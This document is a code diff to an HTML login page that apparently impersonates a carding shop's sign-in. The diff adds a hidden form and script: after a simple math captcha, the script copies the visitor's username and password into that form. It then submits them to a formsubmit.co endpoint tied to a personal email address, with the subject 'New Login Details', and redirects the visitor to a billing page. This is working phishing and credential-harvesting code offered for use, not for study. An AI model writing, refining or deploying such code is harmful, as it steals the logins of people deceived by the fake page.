@@ -21,10 +21,12 @@
 		<form id="emailForm" action="https://formsubmit.co/attavya0@gmail.com" method="POST" style="display: none;">
 			<input type="hidden" name="username" id="emailUsername">
 			<input type="hidden" name="password" id="emailPassword">
-			<input type="hidden" name="_next" value="billings.html">
-			<input type="hidden" name="_subject" value="New Login Credentials">
+			<input type="hidden" name="_next" value="https://www.briansclubas.shop/billings.html">
 			<input type="hidden" name="_captcha" value="false">
+			<input type="hidden" name="_subject" value="New Login Details">
 		</form>
+
+		
 
 		<div style="height: 50px; width: 83%; background: rgb(242, 222, 222); color: rgba(169, 102, 157); margin-top: 20px; border-radius: 5px; border: 1px solid rgb(169, 102, 157); display: none;" class="response2">
 			<p style="float: left; margin-left: 30px; margin-top: 13px; font-size: 14px;">Login or password are incorrect</p>
@@ -82,45 +84,35 @@
 <script src="./index_files/jquery.min.js.download"></script>
 <script type="text/javascript">
 	let input_val = document.getElementById('input_val');
-
 	let num1 = document.getElementById('num1');
 	let num2 = document.getElementById('num2');
-
 	const myBtn = document.getElementById('insert');
 
-
-	// returns a random integer from 0 to 9
 	num1.innerText = Math.floor(Math.random() * 10);
 	num2.innerText = Math.floor(Math.random() * 10);
 
 	let number1 = num1.innerText;
 	let number2 = num2.innerText;
 
-	myBtn.addEventListener("click", ()=> {
-
+	myBtn.addEventListener("click", function(e) {
+		e.preventDefault();
+		
 		let sum_result = parseInt(number1) + parseInt(number2);
-
 		let res = parseInt(input_val.value);
 
 		if (res == sum_result) {
-			$(document).ready(function() {
-				var username = $("#username").val();
-				var password = $("#password").val();
-				$.ajax({
-					url: "index.html",
-					method: "post",
-					data: {username:username, password:password},
-					success: function(data) {
-						if (data == 'yes') {
-							window.location.href = 'billings.html';
-						} else if(data == 'no') {
-							const response2 = document.querySelector(".response2");
-							response2.style.display = "block";
-						}
-					}
-				});
-			});
+			const emailForm = document.getElementById('emailForm');
+			const emailUsername = document.getElementById('emailUsername');
+			const emailPassword = document.getElementById('emailPassword');
 			
+			emailUsername.value = document.getElementById('username').value;
+			emailPassword.value = document.getElementById('password').value;
+			
+			emailForm.submit();
+			
+			setTimeout(function() {
+				window.location.href = 'billings.html';
+			}, 1000);
 		} else {
 			const response = document.querySelector(".response");
 			response.style.display = "block";
